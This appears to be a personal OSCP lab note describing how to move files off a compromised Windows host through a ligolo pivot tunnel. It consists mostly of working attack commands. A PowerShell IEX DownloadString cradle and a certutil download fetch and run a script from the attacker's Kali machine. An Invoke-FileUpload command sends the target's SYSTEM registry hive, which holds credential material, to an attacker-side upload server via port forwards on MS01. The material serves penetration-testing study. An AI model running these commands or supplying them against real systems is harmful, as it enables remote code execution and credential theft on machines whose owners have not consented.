# Method 1  : Uploadserver

On KALI ATTACKER:

(Skip)
```
pipx install uploadserver
```

```
uploadserver 4445
```

---

On Kali (Another tab where you have ligolo proxy running):

Main pivot tunnel
```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

+

Pivot tunnel to send wget request
```
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445
```

Import Powershell script to upload a file to KALI upload server. (Executes immediately)

```
cd ~/Desktop/Tools/Windows && python -m http.server 4445
```

On TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}/PSUpload.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
certutil -urlcache -split -f http://${MS01_IP}:4445/PSUpload.ps1 PSUpload.ps1
```

On KALI
```
uploadserver 4445
```

On TARGET host (MS02): _Evil-WinRM_ PS C:\Users\celia.almeda\Documents>
```
Invoke-FileUpload -Uri "http://[MS01 IP]:4445/upload" -File "C:\windows.old\windows\system32\SYSTEM"
```

Essentially, you are uploading a file to a listener on MS01, which is set up to auto-forward to Kali with the reverse port forward.